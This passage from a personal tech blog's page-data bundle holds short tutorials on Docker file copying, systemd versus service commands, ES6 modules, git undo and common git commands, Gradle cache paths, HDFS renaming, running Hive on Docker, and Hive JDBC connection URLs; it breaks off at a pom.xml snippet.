传输文件到 docker 容器 \n 首先需要知道 docker 容器的 container_id ,可以使用 docker ps 命令来查看你要操作的 docker 容器的 container_id \n Docker容器向宿主机传送文件 \n格式: \n \ndocker  cp  container_id: < docker容器内的路径 >   < 本地保存文件的路径 > \n比如: \n \ndocker  cp  10704c9eb7bb:/root/test.text /home/vagrant/test.txt\n \n 1 2 3 4 5 6 7 #  宿主机向 docker 容器传送文件 \n格式: \n \ndocker  cp  本地文件的路径 container_id: < docker容器内的路径 > \n比如: \n\ndocker  cp   /home/vagrant/test.txt 10704c9eb7bb:/root/test.text\n \n 1 2 3 4 5 6 "},{title:'修复 "System has not been booted with systemd as init system "的错误。',frontmatter:{title:'修复 "System has not been booted with systemd as init system "的错误。',date:"2021-07-17T21:05:58.000Z",tags:["linux","docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/tSZR0Ce0z.jpg",isTop:!1},regularPath:"/blogs/docker/tSZR0Ce0z.html",relativePath:"blogs/docker/tSZR0Ce0z.md",key:"v-32f7ba59",path:"/blogs/docker/tSZR0Ce0z.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在Windows里面用WSL使用Ubuntu，那么系统就是SysV而不是systemd。\n运行systemctl命令时，你的系统就会出错（针对Linux系统的systemd init系统）。 \n \n \n \n Systemd command(linux) \n Sysvinit command(windows => docker => linux) \n \n \n \n \n sudo systemctl start service__name \n sudo service service__name start \n \n \n sudo systemctl stop service__name \n sudo service service__name stop \n \n \n sudo systemctl restart service__name \n sudo service service__name restart \n \n \n sudo systemctl status service__name \n sudo service service__name status \n \n \n sudo systemctl enable service__name \n sudo service service__name enable \n \n \n sudo systemctl disable service__name \n sudo service service__name disable \n \n \n \n"},{title:"ES6模块化之export和import的用法",frontmatter:{title:"ES6模块化之export和import的用法",date:"2021-12-26 21:33:48",tags:["JavaScript","TypeScript","import","export","es6"],categories:"es6",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/es6/es6_import_export.html",relativePath:"blogs/es6/es6_import_export.md",key:"v-3828dd95",path:"/blogs/es6/es6_import_export.html",headers:[{level:2,title:"注意点",slug:"注意点"},{level:2,title:"命名导出（Named exports）",slug:"命名导出-named-exports"},{level:2,title:"别名引入（Aliasing named imports）",slug:"别名引入-aliasing-named-imports"},{level:2,title:"命名空间引入（Namespace imports）",slug:"命名空间引入-namespace-imports"},{level:2,title:"默认导出（Default exports）",slug:"默认导出-default-exports"},{level:2,title:"编写两种引入方式通用的模块",slug:"编写两种引入方式通用的模块"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" ES6中export和import一般的用法有两种 \n \n 命名导出（Named exports） \n 默认导出（Default exports） \n 注意点 \n \n 如果是js项目，则需要在 package.json 添加  \"type\": \"module\", ts的话就不需要。 \n 如果是js项目，引入的时候需要添加文件后缀 .js  , ts的话就不需要。 \n 命名导出（Named exports） \n 就是每一个需要导出的数据类型都要有一个name，统一引入一定要带有{}，即便只有一个需要导出的数据类型。这种写法清爽直观，是推荐的写法。 \n //------ lib.js ------ \n const  sqrt  =  Math . sqrt ; \n function   square ( x )   { \n     return  x  *  x ; \n } \n function   diag ( x ,  y )   { \n     return   sqrt ( square ( x )   +   square ( y ) ) ; \n } \n\n export   { sqrt ,  square ,  diag } \n\n //------ main.js ------ \n import   {  square ,  diag  }   from   'lib.js' ; \nconsole . log ( square ( 11 ) ) ;   // 121 \nconsole . log ( diag ( 4 ,   3 ) ) ;   // 5 \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 把export直接加到声明前面就可以省略{} \n //------ lib.js ------ \n export   const  sqrt  =  Math . sqrt ; \n export   function   square ( x )   { \n     return  x  *  x ; \n } \n export   function   diag ( x ,  y )   { \n     return   sqrt ( square ( x )   +   square ( y ) ) ; \n } \n\n //------ main.js ------ \n import   {  square ,  diag  }   from   'lib.js' ; \nconsole . log ( square ( 11 ) ) ;   // 121 \nconsole . log ( diag ( 4 ,   3 ) ) ;   // 5 \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 无论怎样导出，引入的时候都需要{}。 \n 别名引入（Aliasing named imports） \n 当从不同模块引入的变量名相同的时候 \n import   { speak }   from   './cow.js' \n import   { speak }   from   './goat.js' \n \n 1 2 这些写法显然会造成混乱\n正确的方法是这样的 \n import   { speak  as  cowSpeak }   from   './cow.js' \n import   { speak  as  goatSpeak }   from   './goat.js' \n \n 1 2 可是，当从每个模块需要引入的方法很多的时候，这种写法就显得十分的繁琐、冗长，例如 \n import   { \n  speak  as  cowSpeak , \n  eat  as  cowEat , \n  drink  as  cowDrink\n }   from   './cow.js' \n\n import   { \n  speak  as  goatSpeak , \n  eat  as  goatEat , \n  drink  as  goatDrink\n }   from   './goat.js' \n\n cowSpeak ( )   // moo \n cowEat ( )   // cow eats \n goatSpeak ( )   // baa \n goatDrink ( )   // goat drinks \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 解决方案就是命名空间引入了 \n 命名空间引入（Namespace imports） \n import   *   as  cow  from   './cow.js' \n import   *   as  goat  from   './goat.js' \n\ncow . speak ( )   // moo \ngoat . speak ( )   // baa \n \n 1 2 3 4 5 十分的简洁优雅 \n 默认导出（Default exports） \n 默认导出就不需要name了，但是一个js文件中只能有一个export default。 \n //------ myFunc.js ------ \n export   default   function   ( )   {   ...   } ; \n\n //------ main1.js ------ \n import  myFunc  from   'myFunc' ; \n myFunc ( ) ; \n \n 1 2 3 4 5 6 其实这种导出方式可以看成是命名导出的变种，只不过把命名写成了default。\n虽然export default只能有一个，但也可以导出多个方法。 \n export   default   { \n   speak   ( )   { \n     return   'moo' \n   } , \n   eat   ( )   { \n     return   'cow eats' \n   } , \n   drink   ( )   { \n     return   'cow drinks' \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 引入与命名空间引入类似 \n import  cow  from   './default-cow.js' \n import  goat  from   './default-goat.js' \n\ncow . speak ( )   // moo \ngoat . speak ( )   // baa \n \n 1 2 3 4 5 如果我们在编写模块的时候使用的导出方法不统一，那么引入的时候就需要考虑不同模块引入的方式。这种麻烦可以通过自引用的方法消除。方法如下 \n 编写两种引入方式通用的模块 \n import   *   as  myself  from   './ambidextrous-cow.js'   // import this file into itself \n\n // this module's own namespace is its default export \n export   default  myself\n\n export   function   speak   ( )   { \n  console . log ( 'moo' ) \n } \n \n 1 2 3 4 5 6 7 8 这样在引入的时候就不需要考虑引入方式了。 \n import  cow  from   './ambidextrous-cow' \n import   *   as  alsocow  from   './ambidextrous-cow' \n\ncow . speak ( )   // moo \nalsocow . speak ( )   // moo \n \n 1 2 3 4 5 两种引入方法均可。\n这种方法也有一个小缺点，就是在我们编写的模块中，有一个function是常用的，我们想默认导出，可export default已经使用了，而我们知道export default在一个模块中只能使用一次。这时就要使用Object.assign \n import   *   as  myself  from   './ambidextrous-cow.js' \n\n export   default  Object . assign ( speak ,  myself ) \n\n export   function   speak   ( )   { \n  console . log ( 'moo' ) \n } \n \n 1 2 3 4 5 6 7 需要注意的是，Object.assign只能用于function。 \n 对应引入的例子 \n import  cow  from   './ambidextrous-cow' \n import   *   as  alsocow  from   './ambidextrous-cow' \n\n cow ( )   // moo \ncow . speak ( )   // moo \nalsocow . speak ( )   // moo \n \n 1 2 3 4 5 6 "},{title:"git 放弃修改，放弃增加文件操作",frontmatter:{title:"git 放弃修改，放弃增加文件操作",date:"2021-11-16 17:46:07",tags:["Git"],categories:"command",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/git/git-abandon-update.html",relativePath:"blogs/git/git-abandon-update.md",key:"v-5adb12da",path:"/blogs/git/git-abandon-update.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n 本地修改了一些文件 (并没有使用 git add 到暂存区)，想放弃修改 \n \n \n 单个文件/文件夹： \n \n git  checkout -- filename\n \n 1 \n 所有文件/文件夹： \n \n git  checkout  . \n \n 1 \n 本地新增了一些文件 (并没有 git add 到暂存区)，想放弃修改 \n \n \n 单个文件/文件夹： \n \n rm   -rf filename\n \n 1 \n 所有文件： \n \n git  clean -xdf\n \n 1 \n 删除新增的文件，如果文件已经已经 git add 到暂存区，并不会删除！ \n \n \n 所有文件和文件夹： \n \n git  clean -xdff\n \n 1 \n [谨慎操作] 本命令删除新增的文件和文件夹，如果文件已经已经 git add 到暂存区，并不会删除！ \n \n \n 本地修改/新增了一些文件，已经 git add 到暂存区，想放弃修改 \n \n \n 单个文件/文件夹： \n \n git  reset HEAD filename\n \n 1 \n 所有文件/文件夹： \n \n git  reset HEAD  . \n \n 1 \n 本地通过 git add 和 git commit 后，想要撤销此次 commit \n \n \n 撤销 commit, 同时保留该 commit 修改： \n \n git  reset commit_id\n \n 1 这个 commit_id 是你想要回到的那个节点，可以通过 git log 查看，可以只选前 6 位。 \n \n 撤销之后，你所做的已经 commit 的修改还在工作区！ \n \n \n 撤销 commit, 同时本地删除该 commit 修改： \n \n git  reset --hard commit_id\n \n 1 这个 commit_id 是你想要回到的那个节点，可以通过 git log 查看，可以只选前6位 \n \n [谨慎操作] 撤销之后，你所做的已经 commit 的修改将会清除，仍在工作区/暂存区的代码也将会清除！ \n \n"},{title:"git 常见命令",frontmatter:{title:"git 常见命令",date:"2021-11-08 18:11:16",tags:["Git"],categories:"command",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/git/git-command.html",relativePath:"blogs/git/git-command.md",key:"v-0282ef96",path:"/blogs/git/git-command.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' \n 创建仓库 \n \n git  init\n \n 1 \n 列出本地分支 \n \n git  branch\n \n 1 \n 列出所有分支 \n \n git  branch -a\n \n 1 \n 创建分支 \n \n git  branch  ( branchname ) \n \n 1 \n 切换分支 \n \n git  checkout  ( branchname ) \n \n 1 \n 拉取远程分支并创建本地分支 \n \n git  checkout -b qz51142 origin/qz51142\n \n 1 \n 添加文件到暂存区 \n \n git   add   . \n \n 1 \n 将暂存区内容添加到仓库中 \n \n git  commit\n git  commit -m  "update eh-adoption-ui .gitignore #ARTL-8599" \n \n 1 2 \n 查看仓库当前的状态 \n \n git  status\n \n 1 \n 删除本地分支 \n \n git  branch -d  ( branchname ) \n \n 1 \n 删除远程分支 \n \n git  push origin --delete qz51142\n \n 1 \n 同步分支列表 \n \n git  fetch -p\n \n 1 \n 查看提交历史 \n \n git  log\n \n 1 \n 查看指定文件的修改记录 \n \n git  blame  < file > \n \n 1 \n 从远程获取代码并合并本地的版本 \n \n git  pull  < 远程主机名 >   < 远程分支名 > : < 本地分支名 > \n \n 1 \n 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。 \n \n git  pull  < 远程主机名 >   < 远程分支名 > \n git  pull origin master:qz51142\n \n 1 2 \n 从将本地的分支版本上传到远程并合并 \n \n git  push  < 远程主机名 >   < 本地分支名 > : < 远程分支名 > \n \n 1 \n 如果本地分支名与远程分支名相同，则可以省略冒号： \n \n git  push  < 远程主机名 >   < 本地分支名 > \n\n git  push origin qz51142:qz51142\n\n git  reset --hard commitid\n \n 1 2 3 4 5 '},{title:"Where is Gradle Cache Location",frontmatter:{title:"Where is Gradle Cache Location",date:"2021-11-27 13:55:43",tags:["gradle","linux","windows"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/gradle/gradle_set_cache_path.html",relativePath:"blogs/gradle/gradle_set_cache_path.md",key:"v-6c2405b2",path:"/blogs/gradle/gradle_set_cache_path.html",headers:[{level:2,title:"Gradle Cache Location",slug:"gradle-cache-location"},{level:2,title:"Change Gradle Cache Location",slug:"change-gradle-cache-location"},{level:3,title:"In Linux",slug:"in-linux"},{level:3,title:"In Windows",slug:"in-windows"},{level:3,title:"Verification",slug:"verification"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Gradle Cache Location or Gradle local repository is the location where Gradle maintain its cache, which includes all dependencies Gradle downloads from repositories when we build any project, for reusing in the next times we run the build again. \n Gradle Cache Location \n Gradle uses  $USER_HOME/.gradle  as the default directory to store its local cache.\nSo, if you’re in Linux system:  ~/.gradle \nIf you’re in Windows, it should be:  C:\\Users\\[Your_Username]\\.gradle \nFor example,\nIn my Windows 10, the location is:  C:\\Users\\20293\\.gradle \nIn my Ubuntu 20.04, the location is:  /home/ubuntu/.gradle \n Change Gradle Cache Location \n We can change the Gradle Cache Location to some other directory by setting the environment variable  GRADLE_USER_HOME \nFor example, \n In Linux \n Edit the  ~/.bashrc  by any editor such as: vim, nano, etc and append following line at the end of the file. \n export   GRADLE_USER_HOME = /mnt/d/repositories/gradle-repository\n \n 1 Then, issue below command make the environment variables effectively. \n source  ~/.bashrc\n \n 1 #  In Windows \n In Windows 7, right click My Computer and select Properties > Advanced.\nIn Windows 8, Windows 10,  go to Control Panel > System > Advanced System Settings. \n \n Under System Variables, click New \n In the Variable Name field, enter  GRADLE_USER_HOME \n In the Variable Value field, enter your desire folder, for ex:  D:\\Misc\\Gradle \n Click OK \n Verification \n You can verify again by open a new terminal, go to any Gradle project and run some Gradle tasks. Then check the new location where you have just set for the  GRADLE_USER_HOME variable. \n"},{title:"Hadoop Rename command",frontmatter:{title:"Hadoop Rename command",date:"2021-09-02T23:10:53.000Z",tags:["hadoop","command","hdfs"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hdfs/hdfs_rename_command.html",relativePath:"blogs/hdfs/hdfs_rename_command.md",key:"v-6c49fb91",path:"/blogs/hdfs/hdfs_rename_command.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" First of all you can not rename a directory of file in hadoop/HDFS \n but you can do : \n Hadoop fs -mv /warehouse/bigdata/data/test /warehouse/bigdata/data/test_d\n \n 1 If you want to do this for all your 200 HDFS part files then you have to write Shell/bash script to do this in recursive loop. \n just write above hadoop command in shell loop. \n follow this: https://www.cyberciti.biz/tips/renaming-multiple-files-at-a-shell-prompt.html \n and this how to rename all file in a folder with a prefix in a single unix command? \n"},{title:"Apache Hive on Docker",frontmatter:{title:"Apache Hive on Docker",date:"2021-09-02T22:52:05.000Z",tags:["hive","docker"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hive/apach_hive_docker.html",relativePath:"blogs/hive/apach_hive_docker.md",key:"v-18b2e7b5",path:"/blogs/hive/apach_hive_docker.html",headers:[{level:2,title:"docker-compose.yml:",slug:"docker-compose-yml"},{level:2,title:"hadoop-hive.env:",slug:"hadoop-hive-env"},{level:2,title:"employee_table.hql:",slug:"employee-table-hql"},{level:2,title:"employee.csv:",slug:"employee-csv"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' As a big data enthusiast, if you are interested to learn Apache Hive, this blog will help you set it up on your local in few easy steps. This setup will serve as a good starting point for beginners as it will simulate the production environment.\nThis tutorial uses Docker containers to spin up Apache Hive. Before we jump right into it, here is a quick overview of some of the critical components in this cluster. \n Apache Hive: \n Apache Hive is a distributed, fault-tolerant data warehouse system that enables analytics of large datasets residing in distributed storage using SQL. \n Docker: \n Docker is an open-source technology to package an application and all its dependencies into a container. \n NameNode: \n The NameNode is at the core of the Hadoop cluster. It keeps the directory tree of all files in the file system, and tracks where the file data is actually kept in the cluster. \n DataNode: \n The DataNode on the other hand stores the actual file data. Files are replicated across multiple DataNodes in a cluster for reliability.\nSpecifically, if were to think in terms of Hive, the data stored on the Hive tables is spread across the DataNodes within the cluster. NameNode, on the other hand is the one keeping track of these blocks of data actually stored on the DataNodes.\nWe are using a single DataNode in this tutorial for the sake of simplicity. \n Hive Metastore: \n Hive uses a relational database to store the metadata (e.g. schema and location) of all its tables. The default database is Derby, but we will be using PostgreSQL in this tutorial.\nThe key benefit of using a relational database over HDFS is low latency and improved performance. \n Volumes: \n Volumes are the preferred mechanism for persisting data generated by and used by Docker containers.\nVolumes also allow us to persist the container state between subsequent docker runs.\nIf you don’t explicitly create it, a volume is created the first time it is mounted into a container. When that container stops or is removed, the volume still exists. Specifically, in this use case, we are using volumes inside NameNode and DataNode containers to persist the HDFS file system. The volume on PostgreSQL container is utilized to persist the meta-data of the previously created Hive tables. \n Pre-requisites: \n The only pre-requisite is Docker. I’m running it on Macbook Pro with 8 GB RAM. Installing Docker is pretty straightforward. Please follow the instructions on https://docs.docker.com/docker-for-mac/install/ to install it if you do not have it already on your machine. \n 1. Directory Structure: \n Create the directory structure on your local \n mkdir  Hive\n cd  Hive\n touch  docker-compose.yml\n touch  hadoop-hive.env\n mkdir  employee\n cd  employee\n touch  employee_table.hql\n touch  employee.csv\n \n 1 2 3 4 5 6 7 8 #  2. Edit files: \n Open each file in your favorite editor and simply paste the below code snippets in them. \n docker-compose.yml: \n Compose is a Docker tool for defining and running multi-container Docker applications. We are using the below YAML file to configure the services required by our Hive cluster. The biggest advantage of using Compose is that it creates and starts all the services using a single command. \n version :   \'3\' \n services : \n\n   namenode : \n     image :  bde2020/hadoop - namenode : 2.0.0 - hadoop2.7.4 - java8\n     container_name :  namenode\n     volumes : \n       -  ./hdfs/namenode : /hadoop/dfs/name\n     environment : \n       -  CLUSTER_NAME=hive\n     env_file : \n       -  ./hadoop - hive.env\n     ports : \n       -   "50070:50070" \n\n   datanode : \n     image :  bde2020/hadoop - datanode : 2.0.0 - hadoop2.7.4 - java8\n     container_name :  datanode\n     volumes : \n       -  ./hdfs/datanode : /hadoop/dfs/data\n     env_file : \n       -  ./hadoop - hive.env\n     environment : \n       SERVICE_PRECONDITION :   "namenode:50070" \n     depends_on : \n       -  namenode\n     ports : \n       -   "50075:50075" \n\n   hive-server : \n     image :  bde2020/hive : 2.3.2 - postgresql - metastore\n     container_name :  hive - server\n     volumes : \n       -  ./employee : /employee\n     env_file : \n       -  ./hadoop - hive.env\n     environment : \n       HIVE_CORE_CONF_javax_jdo_option_ConnectionURL :   "jdbc:postgresql://hive-metastore/metastore" \n       SERVICE_PRECONDITION :   "hive-metastore:9083" \n     depends_on : \n       -  hive - metastore\n     ports : \n       -   "10000:10000" \n\n   hive-metastore : \n     image :  bde2020/hive : 2.3.2 - postgresql - metastore\n     container_name :  hive - metastore\n     env_file : \n       -  ./hadoop - hive.env\n     command :  /opt/hive/bin/hive  - - service metastore\n     environment : \n       SERVICE_PRECONDITION :   "namenode:50070 datanode:50075 hive-metastore-postgresql:5432" \n     depends_on : \n       -  hive - metastore - postgresql\n     ports : \n       -   "9083:9083" \n\n   hive-metastore-postgresql : \n     image :  bde2020/hive - metastore - postgresql : 2.3.0\n     container_name :  hive - metastore - postgresql\n     volumes : \n       -  ./metastore - postgresql/postgresql/data : /var/lib/postgresql/data\n     depends_on : \n       -  datanode\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #  hadoop-hive.env: \n The .env file is used to set the working enviornment variables. \n HIVE_SITE_CONF_javax_jdo_option_ConnectionURL=jdbc:postgresql://hive-metastore-postgresql/metastore\nHIVE_SITE_CONF_javax_jdo_option_ConnectionDriverName=org.postgresql.Driver\nHIVE_SITE_CONF_javax_jdo_option_ConnectionUserName=hive\nHIVE_SITE_CONF_javax_jdo_option_ConnectionPassword=hive\nHIVE_SITE_CONF_datanucleus_autoCreateSchema=false\nHIVE_SITE_CONF_hive_metastore_uris=thrift://hive-metastore:9083\n\nCORE_CONF_fs_defaultFS=hdfs://namenode:8020\nCORE_CONF_hadoop_http_staticuser_user=root\nCORE_CONF_hadoop_proxyuser_hue_hosts=*\nCORE_CONF_hadoop_proxyuser_hue_groups=*\n\nHDFS_CONF_dfs_webhdfs_enabled=true\nHDFS_CONF_dfs_permissions_enabled=false\n\nYARN_CONF_yarn_log___aggregation___enable=true\nYARN_CONF_yarn_resourcemanager_recovery_enabled=true\nYARN_CONF_yarn_resourcemanager_store_class=org.apache.hadoop.yarn.server.resourcemanager.recovery.FileSystemRMStateStore\nYARN_CONF_yarn_resourcemanager_fs_state___store_uri=/rmstate\nYARN_CONF_yarn_nodemanager_remote___app___log___dir=/app-logs\nYARN_CONF_yarn_log_server_url=http://historyserver:8188/applicationhistory/logs/\nYARN_CONF_yarn_timeline___service_enabled=true\nYARN_CONF_yarn_timeline___service_generic___application___history_enabled=true\nYARN_CONF_yarn_resourcemanager_system___metrics___publisher_enabled=true\nYARN_CONF_yarn_resourcemanager_hostname=resourcemanager\nYARN_CONF_yarn_timeline___service_hostname=historyserver\nYARN_CONF_yarn_resourcemanager_address=resourcemanager:8032\nYARN_CONF_yarn_resourcemanager_scheduler_address=resourcemanager:8030\nYARN_CONF_yarn_resourcemanager_resource__tracker_address=resourcemanager:8031\n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #  employee_table.hql: \n This HQL script will be later used in the tutorial to demonstrate the creation of a sample Hive Database and Table. As soon as docker spins up the hive-server container, this file will be automatically mounted inside it for use. \n create database  if  not exists testdb ; \nuse testdb ; \ncreate external table  if  not exists employee  ( \n  eid int,\n  ename string,\n  age int,\n  jobtype string,\n  storeid int,\n  storelocation string,\n  salary bigint,\n  yrsofexp int\n ) \nrow  format  delimited\nfields terminated by  \',\' \nlines terminated by  \' \\n \' \nstored as textfile location  \'hdfs://namenode:8020/user/hive/warehouse/testdb.db/employee\' ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #  employee.csv: \n This csv file contains some sample records which will be loaded into the employee table. Again, this file is automatically mounted by docker inside the hive-server container at start up. \n 1,Rudolf Bardin,30,cashier,100,New York,40000,5\n2,Rob Trask,22,driver,100,New York,50000,4\n3,Madie Nakamura,20,janitor,100,New York,30000,4\n4,Alesha Huntley,40,cashier,101,Los Angeles,40000,10\n5,Iva Moose,50,cashier,102,Phoenix,50000,20\n \n 1 2 3 4 5 #  3. Create & Start all services: \n Navigate inside the Hive directory on your local and run the single docker compose command to create and start all services required by our Hive cluster. \n docker-compose up\n \n 1 #  4. Verify container status: \n Allow Docker a few minutes to spin up all the containers. I use couple of ways to confirm that the required services are up and running.\nLook for the below message in the logs once you run docker-compose up. \n Snapshot of docker-compose up logs\nRun the command docker stats in another terminal. As docker begins to spin up the containers, their CPU and Memory utilization will stabilize after a few minutes in absence of any other activity on the cluster. \n docker stats\n \n 1 CONTAINER ID   NAME                        CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O         PIDS\n8cfdc9ea3002   hive-server                 0.39%     184.7MiB / 1.941GiB   9.30%     25.5kB / 30.5kB   1.63MB / 659kB    27\n938e98165aa7   hive-metastore              0.39%     191.7MiB / 1.941GiB   9.65%     182kB / 213kB     2.75MB / 164kB    22\n1e8ddecb96de   hive-metastore-postgresql   0.46%     26.36MiB / 1.941GiB   1.33%     207kB / 176kB     2.13MB / 2.14MB   10\n2d4c1ed7ed9d   datanode                    0.13%     112.9MiB / 1.941GiB   5.68%     67.8kB / 324kB    623kB / 156kB     44\nc4b2af14a4cb   namenode                    0.13%     121MiB / 1.941GiB     6.09%     350kB / 82.6kB    1.56MB / 1.23MB  \n \n 1 2 3 4 5 6 #  5. Demo: \n Its time for a quick demo! Log onto the Hive-server and create a sample database and hive table by executing the below command in a new terminal. \n docker  exec  -it hive-server /bin/bash\n \n 1 Navigate to the employee directory on the hive-server container. \n root@dc86b2b9e566:/opt # ls \nhadoop-2.7.4  hive\nroot@dc86b2b9e566:/opt # cd .. \nroot@dc86b2b9e566:/ # ls \nbin  boot  dev employee  entrypoint.sh  etc  hadoop-data  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\nroot@dc86b2b9e566:/ # cd employee/ \n \n 1 2 3 4 5 6 Execute the employee_table.hql to create a new external hive table employee under a new database testdb. \n root@dc86b2b9e566:/employee # hive -f employee_table.hql \n \n 1 Now, let’s add some data to this hive table. For that, simply push the employee.csv present in the employee directory on the hive-server into HDFS. \n root@dc86b2b9e566:/employee # hadoop fs -put employee.csv hdfs://namenode:8020/user/hive/warehouse/testdb.db/employee \n \n 1 #  6. Validate the setup: \n On the hive-server, launch hive to verify the contents of the employee table. \n root@df1ac619536c:/employee # hive \nhive >  show databases ; \nOK\ndefault\ntestdb\nTime taken:  2.363  seconds, Fetched:  2  row ( s ) \nhive >  use testdb ; \nOK\nTime taken:  0.085  seconds\nhive >   select  * from employee ; \nOK\n 1  Rudolf Bardin  30  cashier  100  New York  40000   5 \n 2  Rob Trask  22  driver  100  New York  50000   4 \n 3  Madie Nakamura  20  janitor  100  New York  30000   4 \n 4  Alesha Huntley  40  cashier  101  Los Angeles  40000   10 \n 5  Iva Moose  50  cashier  102  Phoenix  50000   20 \nTime taken:  4.237  seconds, Fetched:  5  row ( s ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #  7. Validate the container state between subsequent docker runs: \n All good so far. You have successfully created a Apache Hive cluster on Docker.\nIt is critical to verify that the Hive tables are maintained between subsequent docker runs and we do not end up losing our progress if docker containers are stopped. Therefore, restart the docker containers and verify that the hive data is persisted or not.\nIn a new terminal, execute below command to stop all docker containers. \n docker-compose down\nStopping hive-server                .. .  done \nStopping hive-metastore             .. .  done \nStopping hive-metastore-postgresql  .. .  done \nStopping datanode                   .. .  done \nStopping namenode                   .. .  done \nRemoving hive-server                .. .  done \nRemoving hive-metastore             .. .  done \nRemoving hive-metastore-postgresql  .. .  done \nRemoving datanode                   .. .  done \nRemoving namenode                   .. .  done \nRemoving network hive_default\n \n 1 2 3 4 5 6 7 8 9 10 11 12 Once all containers are stopped, run docker-compose up one more time. \n docker-compose up\n \n 1 Wait for a few minutes as suggested in step 4 for the containers to come back online, then log onto the hive-server and run the select query. \n docker  exec  -it hive-server /bin/bash\nroot@df1ac619536c:/opt # hive \nhive >   select  * from testdb.employee ; \nOK\n 1  Rudolf Bardin  30  cashier  100  New York  40000   5 \n 2  Rob Trask  22  driver  100  New York  50000   4 \n 3  Madie Nakamura  20  janitor  100  New York  30000   4 \n 4  Alesha Huntley  40  cashier  101  Los Angeles  40000   10 \n 5  Iva Moose  50  cashier  102  Phoenix  50000   20 \nTime taken:  4.237  seconds, Fetched:  5  row ( s ) \n\n \n 1 2 3 4 5 6 7 8 9 10 11 Hurray! We still have our data!\nCongratulations on setting up your hive server on Docker! Keep practicing! \n'},{title:"jdbc连接hive的几种方式",frontmatter:{title:"jdbc连接hive的几种方式",date:"2021-09-25 21:51:43",tags:["hive","jdbc","beeline"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/hive/hive_connect_to_hive.html",relativePath:"blogs/hive/hive_connect_to_hive.md",key:"v-6c77f9f5",path:"/blogs/hive/hive_connect_to_hive.html",headers:[{level:2,title:"使用jdbc连接",slug:"使用jdbc连接"},{level:2,title:"集成到spring boot中，使用DataSourceSpy/JdbcTemplate 连接",slug:"集成到spring-boot中-使用datasourcespy-jdbctemplate-连接"},{level:2,title:"连接模版",slug:"连接模版"},{level:2,title:"连接例子",slug:"连接例子"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Java使用JDBC连接Hive \n 正常情况下的url： \n jdbc:hive2://node1:10000/default\n \n 1 这种情况下，都是默认的，没有权限限制\njdbc url完整的格式 \n jdbc:hive2://<host>:<port>/dbName;sess_var_list?hive_conf_list#hive_var_list\n \n 1 \n sess_var_list参数列表：session参数，如principal，serviceDiscoveryMode等等； \n hive_conf_list参数列表：hive的配置参数，hive-site.xml中的配置项； \n hive_var_list参数列表：hive的变量参数； \n \n 例如，使用用户名和密码连接的URL为 \n jdbc:hive2://localhost:10000;AuthMech=3;UID=UserName;PWD=Password\n \n 1 其中，UID默认为hive，AuthMech默认为2\nhive jdbc连接安全机制也分以下几种情况，分别为无权限、Kerberos、用户名与用户名和密码，安全机制属性为AuthMech，例如： \n jdbc:hive2://localhost:10000;AuthMech=0\ndbc:hive2://localhost:10000;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=hs2.example.com;KrbServiceName=hive\njdbc:hive2://localhost:10000;AuthMech=2;UID=hs2\njdbc:hive2://localhost:10000;AuthMech=3;UID=hs2;PWD=*****\njdbc:hive2://localhost:10000;AuthMech=3;SSL=1;SSLKeyStore=C:\\\\Users\\\\bsmith\\\\Desktop\\\\keystore.jks;SSLKeyStorePwd=*****;UID=hs2;PWD=*****\n \n 1 2 3 4 5 如果要指定hive执行sql时候的相关参数，即hive-site.xml中的某些变量，就需要增加在？后面，key=value形式，多个用分号分隔。例如： \n jdbc:hive2://ubuntu:11000/db2?hive.cli.conf.printheader=true;hive.exec.mode.local.auto.inputbytes.max=9999#stab=salesTable;icol=customerID\njdbc:hive2://?hive.cli.conf.printheader=true;hive.exec.mode.local.auto.inputbytes.max=9999#stab=salesTable;icol=customerID\njdbc:hive2://ubuntu:11000/db2;user=foo;password=bar\njdbc:hive2://server:10001/db;user=foo;password=bar?hive.server2.transport.mode=http;hive.server2.thrift.http.path=hs2\njdbc:hive2://zk01:2181,zk02:2181,zk03:2181/;serviceDiscoveryMode=zooKeeper;zooKeeperNamespace=hiveserver2\n \n 1 2 3 4 5 具体的解析代码在hive-jdbc中，类文件为HiveConnection.java。解析大致流程为： \n // Now parse the connection uri with dummy authority \n URI  jdbcURI  =  URI . create ( uri . substring ( URI_JDBC_PREFIX . length ( ) ) ) ; \n // dbname and session settings（获取第一部分参数） \n String  sessVars  =  jdbcURI . getPath ( ) ; \n // parse hive conf settings（获取第二部分参数） \n String  confStr  =  jdbcURI . getQuery ( ) ; \n // parse hive var settings（获取第三部分参数） \n String  varStr  =  jdbcURI . getFragment ( ) ; \n \n 1 2 3 4 5 6 7 8 #  使用jdbc连接 \n pom.xml \n <?xml version="1.0" 